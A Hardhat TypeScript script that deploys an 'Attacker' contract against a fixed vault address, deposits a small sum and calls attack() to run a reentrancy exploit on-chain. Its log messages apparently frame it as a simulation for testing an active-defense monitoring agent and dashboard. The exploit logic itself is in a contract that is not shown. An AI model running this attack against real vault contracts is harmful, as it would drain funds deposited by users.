import { ethers } from "hardhat";

const VAULT_ADDRESS = "0x596Ff2Ca0f781a2CED29EC685cD1ba038378dE02";
const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

async function main() {
  const [deployer] = await ethers.getSigners();
  console.log("Using account for attack simulation:", deployer.address);
  console.log("Targeting Vault Address:", VAULT_ADDRESS);

  // 1. Deploy the Attacker Contract
  console.log("\n[1] Deploying Malicious Attacker Contract...");
  const Attacker = await ethers.getContractFactory("Attacker");
  const attacker = await Attacker.deploy(VAULT_ADDRESS);
  console.log("Tx hash:", attacker.deploymentTransaction()?.hash);
  
  try {
    await attacker.waitForDeployment();
  } catch(e) {
    console.log("Wait for deployment threw (normal for L2), sleeping 15s...");
    await sleep(15000);
  }
  const attackerAddress = await attacker.getAddress();
  console.log("Attacker deployed to:", attackerAddress);

  // 2. Deposit Funds (Setting the trap)
  console.log("\n[2] Depositing initial funds to Vault via Attacker...");
  const attackAmount = ethers.parseEther("0.00001");
  const depositTx = await attacker.depositToTarget({ value: attackAmount });
  console.log("Deposit Tx hash:", depositTx.hash);
  
  try {
    await depositTx.wait(1);
  } catch(e) {
    console.log("Deposit wait threw, sleeping 15s...");
    await sleep(15000);
  }
  console.log("Deposit confirmed.");

  // 3. Trigger Reentrancy Attack
  console.log("\n[3] INITIATING REENTRANCY ATTACK LOOP...");
  console.log("Calling attack()...");
  const attackTx = await attacker.attack(attackAmount);
  console.log("Attack Tx hash:", attackTx.hash);
  
  try {
    await attackTx.wait(1);
  } catch(e) {
    console.log("Attack wait threw, sleeping 15s...");
    await sleep(15000);
  }
  
  console.log("\n=================================");
  console.log("ATTACK PAYLOAD EXECUTED ON-CHAIN");
  console.log("Monitor the Python Agent and Dashboard for Active Defense Mitigations!");
  console.log("=================================\n");
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
